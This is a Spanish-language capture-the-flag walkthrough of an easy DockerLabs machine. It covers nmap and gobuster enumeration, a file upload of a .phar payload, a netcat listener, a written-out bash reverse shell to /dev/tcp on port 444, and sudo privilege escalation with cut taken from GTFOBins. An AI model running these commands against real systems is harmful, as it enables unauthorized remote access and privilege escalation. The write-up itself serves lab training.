

![DockerLabs](https://dockerlabs.es/images/logos/logo.png)

**Autor:** [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)

**Dificultad:** Fácil

**Fecha de creación:** 17/07/2024

--------------------------------------
Despliegue

```
bash auto_deploy.sh dockerlabs.tar
```

![](./images/Pasted%20image%2020250126152356.png)

Y ahí tenemos la ip de nuestra máquina víctima: 

```
172.17.0.2
```

-----------------------------------------------
Reconocimiento 

Hacemos un mapeo con nmap para ver los puertos abiertos. 

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```


![](./images/Pasted%20image%2020250126152705.png)

Vemos el puerto 80 que está abierto. Por lo que nos vamos a la web y vemos a ver qué hay. 

Vemos lo siguiente:

![](./images/Pasted%20image%2020250126152828.png)

Como vemos no hay nada que nos revele algo de información en la web por lo que haríamos es fuzzing web. 

```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Usamos gobuster y nos devuelve por consola lo siguiente: 

![](./images/Pasted%20image%2020250126153330.png)

Nos sale una ruta por la que posiblemente se suban archivos por otra ruta. 

Lo que podemos es añadir a nuestro gobuster unas extensiones:

```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,py
```

Y nos sale lo siguiente:

![](./images/Pasted%20image%2020250126153751.png)

Y aquí tenemos algo jugoso. 

![](./images/Pasted%20image%2020250126153851.png)

Aquí podría subirse al directorio uploads. 

Intentamos crear un payloads con msfvenom pero nos dice lo siguiente:

![](./images/Pasted%20image%2020250126154611.png)

![](./images/Pasted%20image%2020250126155108.png)

Nos vamos al directorio /uploads

Y aquí tenemos nuestro archivo .phar

![](./images/Pasted%20image%2020250126155232.png)

Nos ponemos a la escucha con netcat. 

```
nc -nlvp 443
```

![](./images/Pasted%20image%2020250126155423.png)

y le damos al archivo. 

![](./images/Pasted%20image%2020250126155502.png)

Pondremos el siguiente comando para estar más estable. Pero antes debemos de estar en la escucha por el puerto 444 o cualquier otro. 

```
bash -c "bash -i >& /dev/tcp/"tu ip"/444 0>&1"
```

![](./images/Pasted%20image%2020250126162525.png)

Y ahora estamos algo más estable. 

Y ahora haremos un tratamiento de la tty.

![](./images/Pasted%20image%2020250126162717.png)

Ya estamos algo más estable. 

Para ver si podemos escalar privilegio usamos sudo -l 

![](./images/Pasted%20image%2020250126162950.png)

Vemos que tenemos acceso como sudo a unos binarios. 

Nos vamos a GTFObins y podemos ver como explotar estos binarios. 

```
LFILE=file_to_read
sudo cut -d "" -f1 "$LFILE"
```

nos vamos al directorio /opt
Y ejecutamos el comando: 

![](./images/Pasted%20image%2020250126163711.png)

Hemos obtenido la clave. 

Así que podemos entrar como root. 


